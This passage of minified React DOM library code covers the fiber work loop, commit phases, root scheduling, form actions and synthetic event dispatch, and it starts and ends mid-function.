                  break a;
                }
                break;
              default:
                ((l = X), (X = 0), (zl = null), Pu(e, s, c, l));
            }
          }
          (ku(), (o = Wl));
          break;
        } catch (t) {
          Cu(e, t);
        }
      while (1);
      return (
        t && e.shellSuspendCounter++,
        (R = Ji = null),
        (K = r),
        (A.H = i),
        (A.A = a),
        J === null && ((q = null), (Y = 0), ri()),
        o
      );
    }
    function ku() {
      for (; J !== null; ) Mu(J);
    }
    function Au(e, t) {
      var n = K;
      K |= 2;
      var r = Tu(),
        a = Eu();
      q !== e || Y !== t
        ? ((nu = null), (tu = Ae() + 500), Su(e, t))
        : (Vl = Ze(e, t));
      a: do
        try {
          if (X !== 0 && J !== null) {
            t = J;
            var o = zl;
            b: switch (X) {
              case 1:
                ((X = 0), (zl = null), Pu(e, t, o, 1));
                break;
              case 2:
              case 9:
                if (Ca(o)) {
                  ((X = 0), (zl = null), Nu(t));
                  break;
                }
                ((t = function () {
                  ((X !== 2 && X !== 9) || q !== e || (X = 7), rd(e));
                }),
                  o.then(t, t));
                break a;
              case 3:
                X = 7;
                break a;
              case 4:
                X = 5;
                break a;
              case 7:
                Ca(o)
                  ? ((X = 0), (zl = null), Nu(t))
                  : ((X = 0), (zl = null), Pu(e, t, o, 7));
                break;
              case 5:
                var s = null;
                switch (J.tag) {
                  case 26:
                    s = J.memoizedState;
                  case 5:
                  case 27:
                    var c = J;
                    if (s ? Wf(s) : c.stateNode.complete) {
                      ((X = 0), (zl = null));
                      var l = c.sibling;
                      if (l !== null) J = l;
                      else {
                        var u = c.return;
                        u === null ? (J = null) : ((J = u), Fu(u));
                      }
                      break b;
                    }
                }
                ((X = 0), (zl = null), Pu(e, t, o, 5));
                break;
              case 6:
                ((X = 0), (zl = null), Pu(e, t, o, 6));
                break;
              case 8:
                (xu(), (Wl = 6));
                break a;
              default:
                throw Error(i(462));
            }
          }
          ju();
          break;
        } catch (t) {
          Cu(e, t);
        }
      while (1);
      return (
        (R = Ji = null),
        (A.H = r),
        (A.A = a),
        (K = n),
        J === null ? ((q = null), (Y = 0), ri(), Wl) : 0
      );
    }
    function ju() {
      for (; J !== null && !Oe(); ) Mu(J);
    }
    function Mu(e) {
      var t = jc(e.alternate, e, Ul);
      ((e.memoizedProps = e.pendingProps), t === null ? Fu(e) : (J = t));
    }
    function Nu(e) {
      var t = e,
        n = t.alternate;
      switch (t.tag) {
        case 15:
        case 0:
          t = hc(n, t, t.pendingProps, t.type, void 0, Y);
          break;
        case 11:
          t = hc(n, t, t.pendingProps, t.type.render, t.ref, Y);
          break;
        case 5:
          Do(t);
        default:
          (zc(n, t), (t = J = mi(t, Ul)), (t = jc(n, t, Ul)));
      }
      ((e.memoizedProps = e.pendingProps), t === null ? Fu(e) : (J = t));
    }
    function Pu(e, t, n, r) {
      ((R = Ji = null), Do(t), (ka = null), (Aa = 0));
      var i = t.return;
      try {
        if (ec(e, i, t, n, Y)) {
          ((Wl = 1), Ys(e, xi(n, e.current)), (J = null));
          return;
        }
      } catch (t) {
        if (i !== null) throw ((J = i), t);
        ((Wl = 1), Ys(e, xi(n, e.current)), (J = null));
        return;
      }
      t.flags & 32768
        ? (L || r === 1
            ? (e = !0)
            : Vl || Y & 536870912
              ? (e = !1)
              : ((Bl = e = !0),
                (r === 2 || r === 9 || r === 3 || r === 6) &&
                  ((r = eo.current),
                  r !== null && r.tag === 13 && (r.flags |= 16384))),
          Iu(t, e))
        : Fu(t);
    }
    function Fu(e) {
      var t = e;
      do {
        if (t.flags & 32768) {
          Iu(t, Bl);
          return;
        }
        e = t.return;
        var n = Lc(t.alternate, t, Ul);
        if (n !== null) {
          J = n;
          return;
        }
        if (((t = t.sibling), t !== null)) {
          J = t;
          return;
        }
        J = t = e;
      } while (t !== null);
      Wl === 0 && (Wl = 5);
    }
    function Iu(e, t) {
      do {
        var n = Rc(e.alternate, e);
        if (n !== null) {
          ((n.flags &= 32767), (J = n));
          return;
        }
        if (
          ((n = e.return),
          n !== null &&
            ((n.flags |= 32768), (n.subtreeFlags = 0), (n.deletions = null)),
          !t && ((e = e.sibling), e !== null))
        ) {
          J = e;
          return;
        }
        J = e = n;
      } while (e !== null);
      ((Wl = 6), (J = null));
    }
    function Lu(e, t, n, r, a, o, s, c, l) {
      e.cancelPendingCommit = null;
      do Hu();
      while (iu !== 0);
      if (K & 6) throw Error(i(327));
      if (t !== null) {
        if (t === e.current) throw Error(i(177));
        if (
          ((o = t.lanes | t.childLanes),
          (o |= ni),
          nt(e, n, o, s, c, l),
          e === q && ((J = q = null), (Y = 0)),
          (ou = t),
          (au = e),
          (su = n),
          (cu = o),
          (lu = a),
          (uu = r),
          t.subtreeFlags & 10256 || t.flags & 10256
            ? ((e.callbackNode = null),
              (e.callbackPriority = 0),
              Xu(Pe, function () {
                return (Uu(), null);
              }))
            : ((e.callbackNode = null), (e.callbackPriority = 0)),
          (r = (t.flags & 13878) != 0),
          t.subtreeFlags & 13878 || r)
        ) {
          ((r = A.T), (A.T = null), (a = j.p), (j.p = 2), (s = K), (K |= 4));
          try {
            il(e, t, n);
          } finally {
            ((K = s), (j.p = a), (A.T = r));
          }
        }
        ((iu = 1), Ru(), zu(), Bu());
      }
    }
    function Ru() {
      if (iu === 1) {
        iu = 0;
        var e = au,
          t = ou,
          n = (t.flags & 13878) != 0;
        if (t.subtreeFlags & 13878 || n) {
          ((n = A.T), (A.T = null));
          var r = j.p;
          j.p = 2;
          var i = K;
          K |= 4;
          try {
            _l(t, e);
            var a = zd,
              o = Ar(e.containerInfo),
              s = a.focusedElem,
              c = a.selectionRange;
            if (
              o !== s &&
              s &&
              s.ownerDocument &&
              kr(s.ownerDocument.documentElement, s)
            ) {
              if (c !== null && jr(s)) {
                var l = c.start,
                  u = c.end;
                if ((u === void 0 && (u = l), `selectionStart` in s))
                  ((s.selectionStart = l),
                    (s.selectionEnd = Math.min(u, s.value.length)));
                else {
                  var d = s.ownerDocument || document,
                    f = (d && d.defaultView) || window;
                  if (f.getSelection) {
                    var p = f.getSelection(),
                      m = s.textContent.length,
                      h = Math.min(c.start, m),
                      g = c.end === void 0 ? h : Math.min(c.end, m);
                    !p.extend && h > g && ((o = g), (g = h), (h = o));
                    var _ = Or(s, h),
                      v = Or(s, g);
                    if (
                      _ &&
                      v &&
                      (p.rangeCount !== 1 ||
                        p.anchorNode !== _.node ||
                        p.anchorOffset !== _.offset ||
                        p.focusNode !== v.node ||
                        p.focusOffset !== v.offset)
                    ) {
                      var y = d.createRange();
                      (y.setStart(_.node, _.offset),
                        p.removeAllRanges(),
                        h > g
                          ? (p.addRange(y), p.extend(v.node, v.offset))
                          : (y.setEnd(v.node, v.offset), p.addRange(y)));
                    }
                  }
                }
              }
              for (d = [], p = s; (p = p.parentNode); )
                p.nodeType === 1 &&
                  d.push({ element: p, left: p.scrollLeft, top: p.scrollTop });
              for (
                typeof s.focus == `function` && s.focus(), s = 0;
                s < d.length;
                s++
              ) {
                var b = d[s];
                ((b.element.scrollLeft = b.left),
                  (b.element.scrollTop = b.top));
              }
            }
            ((sp = !!Rd), (zd = Rd = null));
          } finally {
            ((K = i), (j.p = r), (A.T = n));
          }
        }
        ((e.current = t), (iu = 2));
      }
    }
    function zu() {
      if (iu === 2) {
        iu = 0;
        var e = au,
          t = ou,
          n = (t.flags & 8772) != 0;
        if (t.subtreeFlags & 8772 || n) {
          ((n = A.T), (A.T = null));
          var r = j.p;
          j.p = 2;
          var i = K;
          K |= 4;
          try {
            al(e, t.alternate, t);
          } finally {
            ((K = i), (j.p = r), (A.T = n));
          }
        }
        iu = 3;
      }
    }
    function Bu() {
      if (iu === 4 || iu === 3) {
        ((iu = 0), ke());
        var e = au,
          t = ou,
          n = su,
          r = uu;
        t.subtreeFlags & 10256 || t.flags & 10256
          ? (iu = 5)
          : ((iu = 0), (ou = au = null), Vu(e, e.pendingLanes));
        var i = e.pendingLanes;
        if (
          (i === 0 && (ru = null),
          st(n),
          (t = t.stateNode),
          Be && typeof Be.onCommitFiberRoot == `function`)
        )
          try {
            Be.onCommitFiberRoot(ze, t, void 0, (t.current.flags & 128) == 128);
          } catch {}
        if (r !== null) {
          ((t = A.T), (i = j.p), (j.p = 2), (A.T = null));
          try {
            for (var a = e.onRecoverableError, o = 0; o < r.length; o++) {
              var s = r[o];
              a(s.value, { componentStack: s.stack });
            }
          } finally {
            ((A.T = t), (j.p = i));
          }
        }
        (su & 3 && Hu(),
          rd(e),
          (i = e.pendingLanes),
          n & 261930 && i & 42
            ? e === fu
              ? du++
              : ((du = 0), (fu = e))
            : (du = 0),
          id(0, !1));
      }
    }
    function Vu(e, t) {
      (e.pooledCacheLanes &= t) === 0 &&
        ((t = e.pooledCache), t != null && ((e.pooledCache = null), ca(t)));
    }
    function Hu() {
      return (Ru(), zu(), Bu(), Uu());
    }
    function Uu() {
      if (iu !== 5) return !1;
      var e = au,
        t = cu;
      cu = 0;
      var n = st(su),
        r = A.T,
        a = j.p;
      try {
        ((j.p = 32 > n ? 32 : n), (A.T = null), (n = lu), (lu = null));
        var o = au,
          s = su;
        if (((iu = 0), (ou = au = null), (su = 0), K & 6)) throw Error(i(331));
        var c = K;
        if (
          ((K |= 4),
          Pl(o.current),
          El(o, o.current, s, n),
          (K = c),
          id(0, !1),
          Be && typeof Be.onPostCommitFiberRoot == `function`)
        )
          try {
            Be.onPostCommitFiberRoot(ze, o);
          } catch {}
        return !0;
      } finally {
        ((j.p = a), (A.T = r), Vu(e, t));
      }
    }
    function Wu(e, t, n) {
      ((t = xi(n, t)),
        (t = Zs(e.stateNode, t, 2)),
        (e = Va(e, t, 2)),
        e !== null && (tt(e, 2), rd(e)));
    }
    function Z(e, t, n) {
      if (e.tag === 3) Wu(e, e, n);
      else
        for (; t !== null; ) {
          if (t.tag === 3) {
            Wu(t, e, n);
            break;
          } else if (t.tag === 1) {
            var r = t.stateNode;
            if (
              typeof t.type.getDerivedStateFromError == `function` ||
              (typeof r.componentDidCatch == `function` &&
                (ru === null || !ru.has(r)))
            ) {
              ((e = xi(n, e)),
                (n = Qs(2)),
                (r = Va(t, n, 2)),
                r !== null && ($s(n, r, t, e), tt(r, 2), rd(r)));
              break;
            }
          }
          t = t.return;
        }
    }
    function Gu(e, t, n) {
      var r = e.pingCache;
      if (r === null) {
        r = e.pingCache = new Rl();
        var i = new Set();
        r.set(t, i);
      } else ((i = r.get(t)), i === void 0 && ((i = new Set()), r.set(t, i)));
      i.has(n) ||
        ((Hl = !0), i.add(n), (e = Ku.bind(null, e, t, n)), t.then(e, e));
    }
    function Ku(e, t, n) {
      var r = e.pingCache;
      (r !== null && r.delete(t),
        (e.pingedLanes |= e.suspendedLanes & n),
        (e.warmLanes &= ~n),
        q === e &&
          (Y & n) === n &&
          (Wl === 4 || (Wl === 3 && (Y & 62914560) === Y && 300 > Ae() - $l)
            ? !(K & 2) && Su(e, 0)
            : (ql |= n),
          Yl === Y && (Yl = 0)),
        rd(e));
    }
    function qu(e, t) {
      (t === 0 && (t = $e()), (e = oi(e, t)), e !== null && (tt(e, t), rd(e)));
    }
    function Ju(e) {
      var t = e.memoizedState,
        n = 0;
      (t !== null && (n = t.retryLane), qu(e, n));
    }
    function Yu(e, t) {
      var n = 0;
      switch (e.tag) {
        case 31:
        case 13:
          var r = e.stateNode,
            a = e.memoizedState;
          a !== null && (n = a.retryLane);
          break;
        case 19:
          r = e.stateNode;
          break;
        case 22:
          r = e.stateNode._retryCache;
          break;
        default:
          throw Error(i(314));
      }
      (r !== null && r.delete(t), qu(e, n));
    }
    function Xu(e, t) {
      return Ee(e, t);
    }
    var Zu = null,
      Qu = null,
      $u = !1,
      ed = !1,
      td = !1,
      nd = 0;
    function rd(e) {
      (e !== Qu &&
        e.next === null &&
        (Qu === null ? (Zu = Qu = e) : (Qu = Qu.next = e)),
        (ed = !0),
        $u || (($u = !0), ud()));
    }
    function id(e, t) {
      if (!td && ed) {
        td = !0;
        do
          for (var n = !1, r = Zu; r !== null; ) {
            if (!t)
              if (e !== 0) {
                var i = r.pendingLanes;
                if (i === 0) var a = 0;
                else {
                  var o = r.suspendedLanes,
                    s = r.pingedLanes;
                  ((a = (1 << (31 - He(42 | e) + 1)) - 1),
                    (a &= i & ~(o & ~s)),
                    (a = a & 201326741 ? (a & 201326741) | 1 : a ? a | 2 : 0));
                }
                a !== 0 && ((n = !0), ld(r, a));
              } else
                ((a = Y),
                  (a = Xe(
                    r,
                    r === q ? a : 0,
                    r.cancelPendingCommit !== null || r.timeoutHandle !== -1,
                  )),
                  !(a & 3) || Ze(r, a) || ((n = !0), ld(r, a)));
            r = r.next;
          }
        while (n);
        td = !1;
      }
    }
    function ad() {
      od();
    }
    function od() {
      ed = $u = !1;
      var e = 0;
      nd !== 0 && Gd() && (e = nd);
      for (var t = Ae(), n = null, r = Zu; r !== null; ) {
        var i = r.next,
          a = sd(r, t);
        (a === 0
          ? ((r.next = null),
            n === null ? (Zu = i) : (n.next = i),
            i === null && (Qu = n))
          : ((n = r), (e !== 0 || a & 3) && (ed = !0)),
          (r = i));
      }
      ((iu !== 0 && iu !== 5) || id(e, !1), nd !== 0 && (nd = 0));
    }
    function sd(e, t) {
      for (
        var n = e.suspendedLanes,
          r = e.pingedLanes,
          i = e.expirationTimes,
          a = e.pendingLanes & -62914561;
        0 < a;
      ) {
        var o = 31 - He(a),
          s = 1 << o,
          c = i[o];
        (c === -1
          ? ((s & n) === 0 || (s & r) !== 0) && (i[o] = Qe(s, t))
          : c <= t && (e.expiredLanes |= s),
          (a &= ~s));
      }
      if (
        ((t = q),
        (n = Y),
        (n = Xe(
          e,
          e === t ? n : 0,
          e.cancelPendingCommit !== null || e.timeoutHandle !== -1,
        )),
        (r = e.callbackNode),
        n === 0 ||
          (e === t && (X === 2 || X === 9)) ||
          e.cancelPendingCommit !== null)
      )
        return (
          r !== null && r !== null && De(r),
          (e.callbackNode = null),
          (e.callbackPriority = 0)
        );
      if (!(n & 3) || Ze(e, n)) {
        if (((t = n & -n), t === e.callbackPriority)) return t;
        switch ((r !== null && De(r), st(n))) {
          case 2:
          case 8:
            n = Ne;
            break;
          case 32:
            n = Pe;
            break;
          case 268435456:
            n = Ie;
            break;
          default:
            n = Pe;
        }
        return (
          (r = cd.bind(null, e)),
          (n = Ee(n, r)),
          (e.callbackPriority = t),
          (e.callbackNode = n),
          t
        );
      }
      return (
        r !== null && r !== null && De(r),
        (e.callbackPriority = 2),
        (e.callbackNode = null),
        2
      );
    }
    function cd(e, t) {
      if (iu !== 0 && iu !== 5)
        return ((e.callbackNode = null), (e.callbackPriority = 0), null);
      var n = e.callbackNode;
      if (Hu() && e.callbackNode !== n) return null;
      var r = Y;
      return (
        (r = Xe(
          e,
          e === q ? r : 0,
          e.cancelPendingCommit !== null || e.timeoutHandle !== -1,
        )),
        r === 0
          ? null
          : (gu(e, r, t),
            sd(e, Ae()),
            e.callbackNode != null && e.callbackNode === n
              ? cd.bind(null, e)
              : null)
      );
    }
    function ld(e, t) {
      if (Hu()) return null;
      gu(e, t, !0);
    }
    function ud() {
      Yd(function () {
        K & 6 ? Ee(Me, ad) : od();
      });
    }
    function dd() {
      if (nd === 0) {
        var e = da;
        (e === 0 && ((e = Ke), (Ke <<= 1), !(Ke & 261888) && (Ke = 256)),
          (nd = e));
      }
      return nd;
    }
    function fd(e) {
      return e == null || typeof e == `symbol` || typeof e == `boolean`
        ? null
        : typeof e == `function`
          ? e
          : rn(`` + e);
    }
    function pd(e, t) {
      var n = t.ownerDocument.createElement(`input`);
      return (
        (n.name = t.name),
        (n.value = t.value),
        e.id && n.setAttribute(`form`, e.id),
        t.parentNode.insertBefore(n, t),
        (e = new FormData(e)),
        n.parentNode.removeChild(n),
        e
      );
    }
    function md(e, t, n, r, i) {
      if (t === `submit` && n && n.stateNode === i) {
        var a = fd((i[ft] || null).action),
          o = r.submitter;
        o &&
          ((t = (t = o[ft] || null)
            ? fd(t.formAction)
            : o.getAttribute(`formAction`)),
          t !== null && ((a = t), (o = null)));
        var s = new En(`action`, `action`, null, r, i);
        e.push({
          event: s,
          listeners: [
            {
              instance: null,
              listener: function () {
                if (r.defaultPrevented) {
                  if (nd !== 0) {
                    var e = o ? pd(i, o) : new FormData(i);
                    Cs(
                      n,
                      { pending: !0, data: e, method: i.method, action: a },
                      null,
                      e,
                    );
                  }
                } else
                  typeof a == `function` &&
                    (s.preventDefault(),
                    (e = o ? pd(i, o) : new FormData(i)),
                    Cs(
                      n,
                      { pending: !0, data: e, method: i.method, action: a },
                      a,
                      e,
                    ));
              },
              currentTarget: i,
            },
          ],
        });
      }
    }
    for (var hd = 0; hd < Zr.length; hd++) {
      var gd = Zr[hd];
      Qr(gd.toLowerCase(), `on` + (gd[0].toUpperCase() + gd.slice(1)));
    }
    (Qr(Ur, `onAnimationEnd`),
      Qr(Wr, `onAnimationIteration`),
      Qr(Gr, `onAnimationStart`),
      Qr(`dblclick`, `onDoubleClick`),
      Qr(`focusin`, `onFocus`),
      Qr(`focusout`, `onBlur`),
      Qr(Kr, `onTransitionRun`),
      Qr(qr, `onTransitionStart`),
      Qr(Jr, `onTransitionCancel`),
      Qr(Yr, `onTransitionEnd`),
      Ot(`onMouseEnter`, [`mouseout`, `mouseover`]),
      Ot(`onMouseLeave`, [`mouseout`, `mouseover`]),
      Ot(`onPointerEnter`, [`pointerout`, `pointerover`]),
      Ot(`onPointerLeave`, [`pointerout`, `pointerover`]),
      Dt(
        `onChange`,
        `change click focusin focusout input keydown keyup selectionchange`.split(
          ` `,
        ),
      ),
      Dt(
        `onSelect`,
        `focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange`.split(
          ` `,
        ),
      ),
      Dt(`onBeforeInput`, [`compositionend`, `keypress`, `textInput`, `paste`]),
      Dt(
        `onCompositionEnd`,
        `compositionend focusout keydown keypress keyup mousedown`.split(` `),
      ),
      Dt(
        `onCompositionStart`,
        `compositionstart focusout keydown keypress keyup mousedown`.split(` `),
      ),
      Dt(
        `onCompositionUpdate`,
        `compositionupdate focusout keydown keypress keyup mousedown`.split(
          ` `,
        ),
      ));
    var _d =
        `abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting`.split(
          ` `,
        ),
      vd = new Set(
        `beforetoggle cancel close invalid load scroll scrollend toggle`
          .split(` `)
          .concat(_d),
      );
    function yd(e, t) {
      t = (t & 4) != 0;
      for (var n = 0; n < e.length; n++) {
        var r = e[n],
          i = r.event;
        r = r.listeners;
        a: {
          var a = void 0;
          if (t)
            for (var o = r.length - 1; 0 <= o; o--) {
              var s = r[o],
                c = s.instance,
                l = s.currentTarget;
              if (((s = s.listener), c !== a && i.isPropagationStopped()))
                break a;
              ((a = s), (i.currentTarget = l));
              try {
                a(i);
              } catch (e) {
                $r(e);
              }
              ((i.currentTarget = null), (a = c));
            }
          else
            for (o = 0; o < r.length; o++) {
              if (
                ((s = r[o]),
                (c = s.instance),
                (l = s.currentTarget),
                (s = s.listener),
                c !== a && i.isPropagationStopped())
              )
                break a;
              ((a = s), (i.currentTarget = l));
              try {
                a(i);
              } catch (e) {
                $r(e);
              }
              ((i.currentTarget = null), (a = c));
            }
        }
      }
    }
    function Q(e, t) {
      var n = t[mt];
      n === void 0 && (n = t[mt] = new Set());
      var r = e + `__bubble`;
      n.has(r) || (Cd(t, e, 2, !1), n.add(r));
    }
    function bd(e, t, n) {
      var r = 0;
      (t && (r |= 4), Cd(n, e, r, t));
    }
    var xd = `_reactListening` + Math.random().toString(36).slice(2);
    function Sd(e) {
      if (!e[xd]) {
        ((e[xd] = !0),
          Tt.forEach(function (t) {
            t !== `selectionchange` &&
              (vd.has(t) || bd(t, !1, e), bd(t, !0, e));
          }));
        var t = e.nodeType === 9 ? e : e.ownerDocument;
        t === null || t[xd] || ((t[xd] = !0), bd(`selectionchange`, !1, t));
      }
    }
    function Cd(e, t, n, r) {
      switch (mp(t)) {
        case 2:
          var i = cp;
          break;
        case 8:
          i = lp;
          break;
        default:
          i = up;
      }
      ((n = i.bind(null, t, n, e)),
        (i = void 0),
        !hn ||
          (t !== `touchstart` && t !== `touchmove` && t !== `wheel`) ||
          (i = !0),
        r
          ? i === void 0
            ? e.addEventListener(t, n, !0)
            : e.addEventListener(t, n, { capture: !0, passive: i })
          : i === void 0
            ? e.addEventListener(t, n, !1)
            : e.addEventListener(t, n, { passive: i }));
    }
    function wd(e, t, n, r, i) {
      var a = r;
      if (!(t & 1) && !(t & 2) && r !== null)
        a: for (;;) {
          if (r === null) return;
          var s = r.tag;
          if (s === 3 || s === 4) {
            var c = r.stateNode.containerInfo;
            if (c === i) break;
            if (s === 4)
              for (s = r.return; s !== null; ) {
                var l = s.tag;
                if ((l === 3 || l === 4) && s.stateNode.containerInfo === i)
                  return;
                s = s.return;
              }
            for (; c !== null; ) {
              if (((s = bt(c)), s === null)) return;
              if (((l = s.tag), l === 5 || l === 6 || l === 26 || l === 27)) {
                r = a = s;
                continue a;
              }
              c = c.parentNode;
            }
          }
          r = r.return;
        }
      fn(function () {
        var r = a,
          i = sn(n),
          s = [];
        a: {
          var c = Xr.get(e);
          if (c !== void 0) {
            var l = En,
              u = e;
            switch (e) {
              case `keypress`:
                if (xn(n) === 0) break a;
              case `keydown`:
              case `keyup`:
                l = Wn;
                break;
              case `focusin`:
                ((u = `focus`), (l = Fn));
                break;
              case `focusout`:
                ((u = `blur`), (l = Fn));
                break;
              case `beforeblur`:
              case `afterblur`:
                l = Fn;
                break;
              case `click`:
                if (n.button === 2) break a;
              case `auxclick`:
              case `dblclick`:
              case `mousedown`:
              case `mousemove`:
              case `mouseup`:
              case `mouseout`:
              case `mouseover`:
              case `contextmenu`:
                l = Nn;
                break;
              case `drag`:
              case `dragend`:
              case `dragenter`:
              case `dragexit`:
              case `dragleave`:
              case `dragover`:
              case `dragstart`:
              case `drop`:
                l = Pn;
                break;
              case `touchcancel`:
              case `touchend`:
              case `touchmove`:
              case `touchstart`:
                l = Kn;
                break;
              case Ur:
              case Wr:
              case Gr:
                l = In;
                break;
              case Yr:
                l = qn;
                break;
              case `scroll`:
              case `scrollend`:
                l = On;
                break;
              case `wheel`:
                l = Jn;
                break;
              case `copy`:
              case `cut`:
              case `paste`:
                l = Ln;
                break;
              case `gotpointercapture`:
              case `lostpointercapture`:
              case `pointercancel`:
              case `pointerdown`:
              case `pointermove`:
              case `pointerout`:
              case `pointerover`:
              case `pointerup`:
                l = Gn;
                break;
              case `toggle`:
              case `beforetoggle`:
                l = Yn;
            }
            var d = (t & 4) != 0,
              f = !d && (e === `scroll` || e === `scrollend`),
              p = d ? (c === null ? null : c + `Capture`) : c;
            d = [];
            for (var m = r, h; m !== null; ) {
              var g = m;
              if (
                ((h = g.stateNode),
                (g = g.tag),
                (g !== 5 && g !== 26 && g !== 27) ||
                  h === null ||
                  p === null ||
                  ((g = pn(m, p)), g != null && d.push(Td(m, g, h))),
                f)
              )
                break;
              m = m.return;
            }
            0 < d.length &&
              ((c = new l(c, u, null, n, i)),
              s.push({ event: c, listeners: d }));
          }
        }
        if (!(t & 7)) {
          a: {
            if (
              ((c = e === `mouseover` || e === `pointerover`),
              (l = e === `mouseout` || e === `pointerout`),
              c &&
                n !== on &&
                (u = n.relatedTarget || n.fromElement) &&
                (bt(u) || u[pt]))
            )
              break a;
            if (
              (l || c) &&
              ((c =
                i.window === i
                  ? i
                  : (c = i.ownerDocument)
                    ? c.defaultView || c.parentWindow
                    : window),
              l
                ? ((u = n.relatedTarget || n.toElement),
                  (l = r),
                  (u = u ? bt(u) : null),
                  u !== null &&
                    ((f = o(u)),
                    (d = u.tag),
                    u !== f || (d !== 5 && d !== 27 && d !== 6)) &&
                    (u = null))
                : ((l = null), (u = r)),
              l !== u)
            ) {
              if (
                ((d = Nn),
                (g = `onMouseLeave`),
                (p = `onMouseEnter`),
                (m = `mouse`),
                (e === `pointerout` || e === `pointerover`) &&
                  ((d = Gn),
                  (g = `onPointerLeave`),
                  (p = `onPointerEnter`),
                  (m = `pointer`)),
                (f = l == null ? c : St(l)),
                (h = u == null ? c : St(u)),
                (c = new d(g, m + `leave`, l, n, i)),
                (c.target = f),
                (c.relatedTarget = h),
                (g = null),
                bt(i) === r &&
                  ((d = new d(p, m + `enter`, u, n, i)),
                  (d.target = h),
                  (d.relatedTarget = f),
                  (g = d)),
                (f = g),
                l && u)
              )
                b: {
                  for (d = Dd, p = l, m = u, h = 0, g = p; g; g = d(g)) h++;
                  g = 0;
                  for (var _ = m; _; _ = d(_)) g++;
                  for (; 0 < h - g; ) ((p = d(p)), h--);
                  for (; 0 < g - h; ) ((m = d(m)), g--);
                  for (; h--; ) {
                    if (p === m || (m !== null && p === m.alternate)) {
                      d = p;
                      break b;
                    }
                    ((p = d(p)), (m = d(m)));
                  }
                  d = null;
                }
              else d = null;
              (l !== null && Od(s, c, l, d, !1),
                u !== null && f !== null && Od(s, f, u, d, !0));
            }
          }
          a: {
            if (
              ((c = r ? St(r) : window),
              (l = c.nodeName && c.nodeName.toLowerCase()),
              l === `select` || (l === `input` && c.type === `file`))
            )
              var v = mr;
            else if (cr(c))
              if (hr) v = Cr;
              else {
                v = Sr;
                var y = xr;
              }
            else
              ((l = c.nodeName),
                !l ||
                l.toLowerCase() !== `input` ||
                (c.type !== `checkbox` && c.type !== `radio`)
                  ? r && en(r.elementType) && (v = mr)
                  : (v = F));
            if ((v &&= v(e, r))) {
              lr(s, v, n, i);
              break a;
            }
            (y && y(e, c, r),
              e === `focusout` &&
                r &&
                c.type === `number` &&
                r.memoizedProps.value != null &&
                Kt(c, `number`, c.value));
          }
          switch (((y = r ? St(r) : window), e)) {
            case `focusin`:
              (cr(y) || y.contentEditable === `true`) &&
                ((Nr = y), (Pr = r), (Fr = null));
              break;
            case `focusout`:
              Fr = Pr = Nr = null;
              break;
            case `mousedown`:
              Ir = !0;
              break;
            case `contextmenu`:
            case `mouseup`:
            case `dragend`:
              ((Ir = !1), Lr(s, n, i));
              break;
            case `selectionchange`:
              if (Mr) break;
            case `keydown`:
            case `keyup`:
              Lr(s, n, i);
          }
          var b;
          if (Zn)
            b: {
              switch (e) {
                case `compositionstart`:
                  var x = `onCompositionStart`;
                  break b;
                case `compositionend`:
                  x = `onCompositionEnd`;
                  break b;
                case `compositionupdate`:
                  x = `onCompositionUpdate`;
                  break b;
              }
              x = void 0;
            }
          else
            P
              ? rr(e, n) && (x = `onCompositionEnd`)
              : e === `keydown` &&
                n.keyCode === 229 &&
                (x = `onCompositionStart`);
          (x &&
            (er &&
              n.locale !== `ko` &&
              (P || x !== `onCompositionStart`
                ? x === `onCompositionEnd` && P && (b = bn())
                : ((_n = i),
                  (vn = `value` in _n ? _n.value : _n.textContent),
                  (P = !0))),
            (y = Ed(r, x)),
            0 < y.length &&
              ((x = new Rn(x, e, null, n, i)),
              s.push({ event: x, listeners: y }),
              b ? (x.data = b) : ((b = ir(n)), b !== null && (x.data = b)))),
            (b = $n ? ar(e, n) : or(e, n)) &&
              ((x = Ed(r, `onBeforeInput`)),
              0 < x.length &&
                ((y = new Rn(`onBeforeInput`, `beforeinput`, null, n, i)),
                s.push({ event: y, listeners: x }),
                (y.data = b))),
            md(s, e, r, n, i));
        }
        yd(s, t);
      });
    }
    function Td(e, t, n) {
      return { instance: e, listener: t, currentTarget: n };
    }
    function Ed(e, t) {
      for (var n = t + `Capture`, r = []; e !== null; ) {
        var i = e,
          a = i.stateNode;
        if (
          ((i = i.tag),
          (i !== 5 && i !== 26 && i !== 27) ||
            a === null ||
            ((i = pn(e, n)),
            i != null && r.unshift(Td(e, i, a)),
            (i = pn(e, t)),
            i != null && r.push(Td(e, i, a))),
          e.tag === 3)
        )
          return r;
        e = e.return;
      }
      return [];
    }
    function Dd(e) {
      if (e === null) return null;
      do e = e.return;
      while (e && e.tag !== 5 && e.tag !== 27);
      return e || null;
    }
    function Od(e, t, n, r, i) {
      for (var a = t._reactName, o = []; n !== null && n !== r; ) {
        var s = n,
          c = s.alternate,
          l = s.stateNode;
        if (((s = s.tag), c !== null && c === r)) break;
        ((s !== 5 && s !== 26 && s !== 27) ||
          l === null ||
          ((c = l),
          i
            ? ((l = pn(n, a)), l != null && o.unshift(Td(n, l, c)))
            : i || ((l = pn(n, a)), l != null && o.push(Td(n, l, c)))),
          (n = n.return));
      }
      o.length !== 0 && e.push({ event: t, listeners: o });
    }
    var kd = /\r\n?/g,
      Ad = /\u0000|\uFFFD/g;
    function jd(e) {
      return (typeof e == `string` ? e : `` + e)
        .replace(
          kd,
          `
`,
        )
        .replace(Ad, ``);
    }
    function Md(e, t) {
      return ((t = jd(t)), jd(e) === t);
    }
    function $(e, t, n, r, a, o) {
      switch (n) {
        case `children`:
          typeof r == `string`
            ? t === `body` || (t === `textarea` && r === ``) || Xt(e, r)
            : (typeof r == `number` || typeof r == `bigint`) &&
              t !== `body` &&
              Xt(e, `` + r);
          break;
        case `className`:
          Pt(e, `class`, r);
          break;
        case `tabIndex`:
          Pt(e, `tabindex`, r);
          break;
        case `dir`:
        case `role`:
        case `viewBox`:
        case `width`:
        case `height`:
          Pt(e, n, r);
          break;
        case `style`:
          $t(e, r, o);
          break;
        case `data`:
          if (t !== `object`) {
            Pt(e, `data`, r);
            break;
          }
        case `src`:
        case `href`:
          if (r === `` && (t !== `a` || n !== `href`)) {
            e.removeAttribute(n);
            break;
          }
          if (
            r == null ||
            typeof r == `function` ||
            typeof r == `symbol` ||
            typeof r == `boolean`
          ) {
            e.removeAttribute(n);
            break;
          }
          ((r = rn(`` + r)), e.setAttribute(n, r));
          break;
        case `action`:
        case `formAction`:
          if (typeof r == `function`) {
            e.setAttribute(
              n,
